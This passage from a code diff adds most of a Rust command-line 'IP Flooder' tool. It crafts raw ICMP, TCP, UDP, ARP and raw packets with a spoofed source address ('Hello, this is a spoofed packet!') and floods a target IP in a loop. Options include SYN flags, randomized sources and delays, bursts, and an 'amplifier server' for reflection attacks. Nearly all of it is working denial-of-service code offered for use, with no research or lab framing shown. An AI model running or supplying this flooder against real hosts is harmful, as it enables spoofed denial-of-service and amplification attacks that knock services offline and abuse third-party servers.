+                   (ip_header[6] >> 5) & 0x07,
+                  u16::from_be_bytes([ip_header[6] & 0x1F, ip_header[7]]),
+                  ip_header[8],
+                   ip_header[9],
+                   u16::from_be_bytes([ip_header[10], ip_header[11]]),
+                   Ipv4Addr::from(u32::from_be_bytes([ip_header[12], ip_header[13], ip_header[14], ip_header[15]])),
+                    Ipv4Addr::from(u32::from_be_bytes([ip_header[16], ip_header[17], ip_header[18], ip_header[19]])),
+             );
+        } else {
+            println!("{}", "  | Incomplete IP Header |".red());
+        }
+        // Payload
+        println!("{}", "  [Payload]".bold());
+        if buffer.len() >= ip_header_len && payload_len > 0 {
+            let payload = &buffer[ip_header_len..packet_len];
+            let payload_str = String::from_utf8_lossy(payload);
+            println!("   Payload ({}) : {}", payload_len, payload_str.green());
+        } else {
+            println!("{}", "  | No Payload |".green());
+        }
+        println!(
+            "{}",
+            "--------------------------------------------------".yellow()
+        );
+    }
+}
+
+impl PacketGenerator {
+    fn new(
+        source_ip: Ipv4Addr,
+        target_ip: Ipv4Addr,
+        protocol: ProtocolType,
+        payload: Vec<u8>,
+        ttl: u8,
+        randomize: bool,
+        rate_limit_ms: u64,
+        pcap_file: Option<String>,
+        tcp_flags: u16,
+        icmp_type: u8,
+        udp_dest_port: u16,
+        burst_size: usize,
+        delay: u64,
+        amplifier_server: Option<Ipv4Addr>,
+        randomize_source: bool,
+        randomize_delay: bool,
+    ) -> Self {
+        PacketGenerator {
+            source_ip,
+            target_ip,
+            protocol,
+            payload,
+            ttl,
+            randomize,
+            running: Arc::new(AtomicBool::new(true)),
+            packets_sent: Arc::new(Mutex::new(0)),
+            rate_limit_ms,
+            pcap_file,
+            tcp_flags,
+            icmp_type,
+            udp_dest_port,
+            burst_size,
+            delay,
+            amplifier_server,
+            randomize_source,
+            randomize_delay,
+        }
+    }
+
+    fn parse_tcp_flags(flags: &str) -> u16 {
+        let mut tcp_flags: u16 = 0;
+        for flag in flags.split(',') {
+            match flag.trim().to_uppercase().as_str() {
+                "SYN" => tcp_flags |= 0x0002,
+                "ACK" => tcp_flags |= 0x0010,
+                "FIN" => tcp_flags |= 0x0001,
+                "RST" => tcp_flags |= 0x0004,
+                "PSH" => tcp_flags |= 0x0008,
+                "URG" => tcp_flags |= 0x0020,
+                "ECE" => tcp_flags |= 0x0040,
+                "CWR" => tcp_flags |= 0x0080,
+                _ => error!("Invalid TCP flag: {}", flag),
+            }
+        }
+        tcp_flags
+    }
+
+    fn send_packet(&self) -> Result<(), std::io::Error> {
+        let protocol_number = match self.protocol {
+            ProtocolType::ICMP => IpNextHeaderProtocols::Icmp.0 as i32,
+            ProtocolType::TCP => IpNextHeaderProtocols::Tcp.0 as i32,
+            ProtocolType::UDP => IpNextHeaderProtocols::Udp.0 as i32,
+            ProtocolType::ARP => EtherTypes::Arp.0 as i32,
+            ProtocolType::RAW => IpNextHeaderProtocol::new(255).0 as i32,
+        };
+
+        let socket = Socket::new(
+            Domain::IPV4,
+            Type::from(libc::SOCK_RAW),
+            Some(Protocol::from(protocol_number)),
+        )?;
+        let target_addr = SocketAddr::new(IpAddr::V4(self.target_ip), 0);
+
+        let mut buffer: [u8; 65535] = [0; 65535];
+        let packet_len = match self.protocol {
+            ProtocolType::ICMP => {
+                let builder = IcmpPacketBuilder::new(
+                    self.source_ip,
+                    self.target_ip,
+                    self.icmp_type,
+                    self.payload.clone(),
+                    self.ttl,
+                    self.amplifier_server,
+                );
+                builder.build_packet(&mut buffer)
+            }
+            ProtocolType::TCP => {
+                let builder = TcpPacketBuilder::new(
+                    self.source_ip,
+                    self.target_ip,
+                    self.tcp_flags,
+                    self.payload.clone(),
+                    self.randomize,
+                    self.ttl,
+                    self.amplifier_server,
+                );
+                builder.build_packet(&mut buffer)
+            }
+            ProtocolType::UDP => {
+                let builder = UdpPacketBuilder::new(
+                    self.source_ip,
+                    self.target_ip,
+                    self.udp_dest_port,
+                    self.payload.clone(),
+                    self.randomize,
+                    self.ttl,
+                    self.amplifier_server,
+                );
+                builder.build_packet(&mut buffer)
+            }
+            ProtocolType::ARP => {
+                let builder = ArpPacketBuilder::new(self.source_ip, self.target_ip, self.ttl);
+                builder.build_packet(&mut buffer)
+            }
+            ProtocolType::RAW => {
+                let builder = RawPacketBuilder::new(
+                    self.source_ip,
+                    self.target_ip,
+                    self.payload.clone(),
+                    self.ttl,
+                    self.amplifier_server,
+                );
+                builder.build_packet(&mut buffer)
+            }
+        };
+        // Call visualization logic before sending packet.
+        match self.protocol {
+            ProtocolType::ICMP => {
+                let builder = IcmpPacketBuilder::new(
+                    self.source_ip,
+                    self.target_ip,
+                    self.icmp_type,
+                    self.payload.clone(),
+                    self.ttl,
+                    self.amplifier_server,
+                );
+                builder.visualize_packet(&buffer, packet_len);
+            }
+            ProtocolType::TCP => {
+                let builder = TcpPacketBuilder::new(
+                    self.source_ip,
+                    self.target_ip,
+                    self.tcp_flags,
+                    self.payload.clone(),
+                    self.randomize,
+                    self.ttl,
+                    self.amplifier_server,
+                );
+                builder.visualize_packet(&buffer, packet_len);
+            }
+            ProtocolType::UDP => {
+                let builder = UdpPacketBuilder::new(
+                    self.source_ip,
+                    self.target_ip,
+                    self.udp_dest_port,
+                    self.payload.clone(),
+                    self.randomize,
+                    self.ttl,
+                    self.amplifier_server,
+                );
+                builder.visualize_packet(&buffer, packet_len);
+            }
+            ProtocolType::ARP => {
+                let builder = ArpPacketBuilder::new(self.source_ip, self.target_ip, self.ttl);
+                builder.visualize_packet(&buffer, packet_len);
+            }
+            ProtocolType::RAW => {
+                let builder = RawPacketBuilder::new(
+                    self.source_ip,
+                    self.target_ip,
+                    self.payload.clone(),
+                    self.ttl,
+                    self.amplifier_server,
+                );
+                builder.visualize_packet(&buffer, packet_len);
+            }
+        };
+
+        let sent_bytes = socket.send_to(&buffer[..packet_len], &target_addr.into())?;
+        if sent_bytes != packet_len {
+            warn!(
+                "Sent {} bytes instead of the expected {}.",
+                sent_bytes, packet_len
+            )
+        }
+
+        // If PCAP flag is set, save to it
+        if let Some(ref pcap_file) = self.pcap_file {
+            self.write_to_pcap(pcap_file, &buffer[..packet_len])?;
+        }
+        let mut packets_sent = self.packets_sent.lock().expect("Failed to lock mutex");
+        *packets_sent += 1;
+        Ok(())
+    }
+
+    fn write_to_pcap(&self, file_path: &str, packet: &[u8]) -> Result<(), std::io::Error> {
+        let capture = Capture::dead(Linktype::ETHERNET).map_err(|e| {
+            std::io::Error::new(
+                std::io::ErrorKind::Other,
+                format!("Failed to create capture: {}", e),
+            )
+        })?;
+        let mut savefile = capture.savefile(file_path).map_err(|e| {
+            std::io::Error::new(
+                std::io::ErrorKind::Other,
+                format!("Failed to create savefile: {}", e),
+            )
+        })?;
+        let header = pcap::PacketHeader {
+            ts: libc::timeval {
+                tv_sec: 0,
+                tv_usec: 0,
+            },
+            caplen: packet.len() as u32,
+            len: packet.len() as u32,
+        };
+        let pcap_packet = PcapPacket::new(&header, packet);
+        savefile.write(&pcap_packet);
+        Ok(())
+    }
+
+    fn start_packet_flood(&self, timeout: Option<u64>) {
+        let running = Arc::clone(&self.running);
+        let packet_generator = Arc::new(PacketGenerator {
+            source_ip: self.source_ip,
+            target_ip: self.target_ip,
+            protocol: self.protocol,
+            payload: self.payload.clone(),
+            ttl: self.ttl,
+            randomize: self.randomize,
+            running: Arc::clone(&self.running),
+            packets_sent: Arc::clone(&self.packets_sent),
+            rate_limit_ms: self.rate_limit_ms,
+            pcap_file: self.pcap_file.clone(),
+            tcp_flags: self.tcp_flags,
+            icmp_type: self.icmp_type,
+            udp_dest_port: self.udp_dest_port,
+            burst_size: self.burst_size,
+            delay: self.delay,
+            amplifier_server: self.amplifier_server,
+            randomize_source: self.randomize_source,
+            randomize_delay: self.randomize_delay,
+        });
+        let start_time = Instant::now();
+        let timeout_duration = timeout.map(Duration::from_secs);
+
+        thread::spawn(move || {
+            let mut last_send_time = Instant::now();
+            let mut rng = rand::thread_rng();
+            let mut packets_in_burst = 0;
+            while running.load(Ordering::SeqCst) {
+                if let Some(timeout) = timeout_duration {
+                    if start_time.elapsed() >= timeout {
+                        info!("Timeout reached. Stopping packet flooding.");
+                        break;
+                    }
+                }
+                if packet_generator.burst_size > 0 && packets_in_burst < packet_generator.burst_size
+                {
+                    match packet_generator.send_packet() {
+                        Ok(_) => {
+                            info!("Packet sent succesfully!");
+                        }
+                        Err(err) => {
+                            error!("Error sending packet: {:?}", err);
+                            if err.kind() == ErrorKind::PermissionDenied {
+                                error!("Insufficient privileges to send raw packets! Please run with elevated permissions (e.g., sudo)");
+                                break;
+                            }
+                        }
+                    }
+                    packets_in_burst += 1;
+                } else {
+                    if packet_generator.burst_size > 0 {
+                        packets_in_burst = 0;
+                        let mut delay = packet_generator.delay;
+                        if packet_generator.randomize_delay {
+                            delay = rng.gen_range(0..packet_generator.delay);
+                        }
+                        thread::sleep(Duration::from_millis(delay));
+                    }
+                    let elapsed = last_send_time.elapsed();
+                    if elapsed >= Duration::from_millis(packet_generator.rate_limit_ms) {
+                        match packet_generator.send_packet() {
+                            Ok(_) => {
+                                info!("Packet sent succesfully!");
+                            }
+                            Err(err) => {
+                                error!("Error sending packet: {:?}", err);
+                                if err.kind() == ErrorKind::PermissionDenied {
+                                    error!("Insufficient privileges to send raw packets! Please run with elevated permissions (e.g., sudo)");
+                                    break;
+                                }
+                            }
+                        }
+                        last_send_time = Instant::now();
+                    } else {
+                        if packet_generator.burst_size == 0 {
+                            thread::sleep(Duration::from_micros(100));
+                        }
+                    }
+                }
+            }
+            //Print statistics after stopping the flooding
+            let end_time = Instant::now();
+            let elapsed_time = end_time.duration_since(start_time);
+            let total_packets = *packet_generator.packets_sent.lock().unwrap();
+            info!(
+                "Packet flood stopped after {:.2?} seconds, a total of {} packets sent",
+                elapsed_time, total_packets
+            );
+        });
+    }
+
+    fn stop_packet_flood(&self) {
+        self.running.store(false, Ordering::SeqCst);
+    }
+}
+
+fn main() {
+    TermLogger::init(
+        LevelFilter::Info, // Changed from Debug to info since all logs where to noisy.
+        Config::default(),
+        TerminalMode::Mixed,
+        ColorChoice::Auto,
+    )
+    .expect("Failed to initialize logger");
+    let mut input = String::new();
+    println!("{}", "Welcome to the IP Flooder!".green().bold());
+
+    loop {
+        let mut source_ip = String::new();
+        let mut target_ip = String::new();
+        let mut protocol = String::new();
+        let mut payload = String::new();
+        let mut ttl = String::new();
+        let mut randomize = String::new();
+        let mut rate_limit_ms = String::new();
+        let mut pcap_file = String::new();
+        let mut tcp_flags = String::new();
+        let mut icmp_type = String::new();
+        let mut udp_dest_port = String::new();
+        let mut timeout = String::new();
+        let mut burst_size = String::new();
+        let mut delay = String::new();
+        let mut amplifier_server = String::new();
+        let mut randomize_source = String::new();
+        let mut randomize_delay = String::new();
+
+        println!("{}", "What do you want to do?".green().bold());
+        println!("{}", "(s)end a packet or (e)xit?".green());
+        print!("{}", "ip_flooder> ".green().bold());
+
+        io::stdin()
+            .read_line(&mut input)
+            .expect("Failed to read line");
+        let input = input.trim();
+
+        if input.eq_ignore_ascii_case("e") || input.eq_ignore_ascii_case("exit") {
+            println!("{}", "Exiting ip_flooder...".green());
+            break;
+        } else if input.eq_ignore_ascii_case("s") || input.eq_ignore_ascii_case("send") {
+            println!(
+                "{}",
+                "Please enter the parameters for your packet:"
+                    .green()
+                    .bold()
+            );
+            print!("Source IP (default: 127.0.0.1): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut source_ip)
+                .expect("Failed to read line");
+            let source_ip = if source_ip.trim().is_empty() {
+                "127.0.0.1".to_string()
+            } else {
+                source_ip.trim().to_string()
+            };
+
+            print!("Target IP (default: 127.0.0.1): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut target_ip)
+                .expect("Failed to read line");
+            let target_ip = if target_ip.trim().is_empty() {
+                "127.0.0.1".to_string()
+            } else {
+                target_ip.trim().to_string()
+            };
+
+            print!("Protocol (default: icmp, options: icmp, tcp, udp, arp, raw): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut protocol)
+                .expect("Failed to read line");
+            let protocol = if protocol.trim().is_empty() {
+                "icmp".to_string()
+            } else {
+                protocol.trim().to_string()
+            };
+            print!("Payload (default: Hello, this is a spoofed packet!): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut payload)
+                .expect("Failed to read line");
+            let payload = if protocol.trim().to_lowercase() == "arp" {
+                "".to_string()
+            } else {
+                if payload.trim().is_empty() {
+                    "Hello, this is a spoofed packet!".to_string()
+                } else {
+                    payload.trim().to_string()
+                }
+            };
+
+            print!("TTL (default: 64): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut ttl)
+                .expect("Failed to read line");
+            let ttl = if ttl.trim().is_empty() {
+                "64".to_string()
+            } else {
+                ttl.trim().to_string()
+            };
+
+            print!("Randomize Source Ports (default: false, options: true or false): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut randomize)
+                .expect("Failed to read line");
+            let randomize = if randomize.trim().is_empty() {
+                "false".to_string()
+            } else {
+                randomize.trim().to_string()
+            };
+
+            print!("Rate Limit (default: 10): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut rate_limit_ms)
+                .expect("Failed to read line");
+            let rate_limit_ms = if rate_limit_ms.trim().is_empty() {
+                "10".to_string()
+            } else {
+                rate_limit_ms.trim().to_string()
+            };
+
+            print!("Pcap File (optional): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut pcap_file)
+                .expect("Failed to read line");
+            let pcap_file = if pcap_file.trim().is_empty() {
+                None
+            } else {
+                Some(pcap_file.trim().to_string())
+            };
+
+            print!("TCP Flags (optional, default: SYN. Example: SYN,ACK,URG): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut tcp_flags)
+                .expect("Failed to read line");
+            let tcp_flags = if tcp_flags.trim().is_empty() {
+                None
+            } else {
+                Some(tcp_flags.trim().to_string())
+            };
+            print!("ICMP Type (optional, default: 8): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut icmp_type)
+                .expect("Failed to read line");
+            let icmp_type = if icmp_type.trim().is_empty() {
+                None
+            } else {
+                Some(icmp_type.trim().to_string())
+            };
+            print!("UDP Destination Port (optional, default: 53): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut udp_dest_port)
+                .expect("Failed to read line");
+            let udp_dest_port = if udp_dest_port.trim().is_empty() {
+                None
+            } else {
+                Some(udp_dest_port.trim().to_string())
+            };
+            print!("Timeout (optional, in seconds): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut timeout)
+                .expect("Failed to read line");
+            let timeout = if timeout.trim().is_empty() {
+                None
+            } else {
+                Some(timeout.trim().to_string())
+            };
+            print!("Burst Size (optional, default: 0, to turn off burst): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut burst_size)
+                .expect("Failed to read line");
+            let burst_size = if burst_size.trim().is_empty() {
+                None
+            } else {
+                Some(burst_size.trim().to_string())
+            };
+            print!("Delay (optional, in ms): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut delay)
+                .expect("Failed to read line");
+            let delay = if delay.trim().is_empty() {
+                None
+            } else {
+                Some(delay.trim().to_string())
+            };
+            print!("Amplifier Server IP (optional): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut amplifier_server)
+                .expect("Failed to read line");
+            let amplifier_server = if amplifier_server.trim().is_empty() {
+                None
+            } else {
+                Some(amplifier_server.trim().to_string())
+            };
+            print!("Randomize Source (optional, options: true or false): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut randomize_source)
+                .expect("Failed to read line");
+            let randomize_source = if randomize_source.trim().is_empty() {
+                "false".to_string()
+            } else {
+                randomize_source.trim().to_string()
+            };
+            print!("Randomize Delay (optional, options: true or false): ");
+            io::stdout().flush().unwrap();
+            io::stdin()
+                .read_line(&mut randomize_delay)
+                .expect("Failed to read line");
+            let randomize_delay = if randomize_delay.trim().is_empty() {
+                "false".to_string()
+            } else {
+                randomize_delay.trim().to_string()
+            };
+            println!();
+
+            let parsed_args = Commands::Send {
+                source_ip: source_ip,
+                target_ip: target_ip,
+                protocol: protocol,
+                payload: payload,
+                ttl: ttl.parse().unwrap_or(64),
+                randomize: randomize.parse().unwrap_or(false),
+                rate_limit_ms: rate_limit_ms.parse().unwrap_or(10),
+                pcap_file: pcap_file,
+                tcp_flags: tcp_flags,
+                icmp_type: icmp_type.map(|x| x.parse().unwrap_or(8)),
+                udp_dest_port: udp_dest_port.map(|x| x.parse().unwrap_or(53)),
+                timeout: timeout.map(|x| x.parse().unwrap_or(10)),
+                burst_size: burst_size.map(|x| x.parse().unwrap_or(0)),
+                delay: delay.map(|x| x.parse().unwrap_or(0)),
+                amplifier_server: amplifier_server,
+                randomize_source: randomize_source.parse().unwrap_or(false),
+                randomize_delay: randomize_delay.parse().unwrap_or(false),
+            };
+            match parsed_args {
+                Commands::Send {
+                    source_ip,
+                    target_ip,
+                    protocol,
+                    payload,
+                    ttl,
+                    randomize,
+                    rate_limit_ms,
+                    pcap_file,
+                    tcp_flags,
+                    icmp_type,
+                    udp_dest_port,
+                    timeout,
+                    burst_size,
+                    delay,
+                    amplifier_server,
+                    randomize_source,
+                    randomize_delay,
+                } => {
+                    let source_ip =
+                        Ipv4Addr::from_str(&source_ip).expect("Invalid source IP address");
+                    let target_ip =
+                        Ipv4Addr::from_str(&target_ip).expect("Invalid target IP address");
+                    let protocol = ProtocolType::from_str(&protocol).unwrap_or_else(|_| {
+                            error!("Invalid protocol specified: {}. Valid options are icmp, tcp, udp, arp, or raw.", protocol);
+                            std::process::exit(1);
+                       });
+                    let mut payload_data = Vec::new();
+                    if protocol != ProtocolType::ARP {
+                        //Only process payload for protocols not ARP
+                        if payload.starts_with("@") {
+                            let file_path = payload.trim_start_matches("@");
+                            let mut file = File::open(file_path).unwrap_or_else(|_| {
+                                error!("Could not open file: {}", file_path);
+                                std::process::exit(1);
+                            });
+                            file.read_to_end(&mut payload_data).unwrap_or_else(|_| {
+                                error!("Could not read file: {}", file_path);
+                                std::process::exit(1);
+                            });
+                        } else {
+                            payload_data =  match payload.as_str() {
+                                 "http_get" => b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n".to_vec(),
+                                "dns_query" => b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01".to_vec(),
+                                _=> payload.as_bytes().to_vec(),
+                                }
+                        }
+                    }
+
+                    let tcp_flags = tcp_flags
+                        .map(|flags| PacketGenerator::parse_tcp_flags(&flags))
+                        .unwrap_or(0x0002);
+                    let icmp_type = icmp_type.unwrap_or(8);
+                    let udp_dest_port = udp_dest_port.unwrap_or(53);
+                    let burst_size = burst_size.unwrap_or(0);
+                    let delay = delay.unwrap_or(0);
+                    let amplifier_server = match amplifier_server {
+                        Some(ip) => {
+                            Some(Ipv4Addr::from_str(&ip).expect("Invalid amplifier IP address"))
+                        }
+                        None => None,
+                    };
+                    let generator = PacketGenerator::new(
+                        source_ip,
+                        target_ip,
+                        protocol,
+                        payload_data,
+                        ttl,
+                        randomize,
+                        rate_limit_ms,
+                        pcap_file,
+                        tcp_flags,
+                        icmp_type,
+                        udp_dest_port,
+                        burst_size,
+                        delay,
+                        amplifier_server,
+                        randomize_source,
+                        randomize_delay,
+                    );
+                    info!("Starting packet flooding with the following options:");
+                    info!(
+                        "   Source IP:    {}",
+                        generator.source_ip.to_string().green()
+                    );
+                    info!(
+                        "   Target IP:    {}",
+                        generator.target_ip.to_string().green()
+                    );
+                    info!(
+                        "   Protocol:     {}",
+                        format!("{:?}", generator.protocol).green()
+                    );
+                    if protocol != ProtocolType::ARP {
+                        info!(
+                            "   Payload:      {}",
+                            String::from_utf8_lossy(&generator.payload).green()
+                        );
+                    }
+
+                    info!("   TTL:          {}", generator.ttl.to_string().green());
+                    info!(
+                        "   Randomize:    {}",
+                        generator.randomize.to_string().green()
+                    );
+                    info!(
+                        "   Rate Limit:   {} ms",
+                        generator.rate_limit_ms.to_string().green()
+                    );
+                    info!("   TCP Flags:   {:?}", generator.tcp_flags);
+                    info!(
+                        "   ICMP Type:   {}",
+                        generator.icmp_type.to_string().green()
+                    );
+                    info!(
+                        "   UDP Dest Port:   {}",
+                        generator.udp_dest_port.to_string().green()
+                    );
+                    if let Some(pcap_file) = &generator.pcap_file {
+                        info!("  PCAP File:     {}", pcap_file.green());
+                    }
+                    if generator.burst_size > 0 {
+                        info!(
+                            "   Burst Size:  {}",
+                            generator.burst_size.to_string().green()
+                        );
+                        info!("   Delay:  {} ms", generator.delay.to_string().green());
+                    }
+                    if let Some(ip) = generator.amplifier_server {
+                        info!("   Amplifier Server:  {}", ip.to_string().green());
+                    }
+                    generator.start_packet_flood(timeout);
+                    // Keep the main thread alive to allow packets to be sent until stop is called
+                    if timeout.is_none() {
+                        // If no timeout was given, wait 10 seconds by default
+                        std::thread::sleep(Duration::from_secs(10));
+                        info!("Stopping packet flooding...");
+                        generator.stop_packet_flood();
+                        info!("Packet flooding has stopped.");
+                    }
+                }
+            }
+        }
+    }
+}
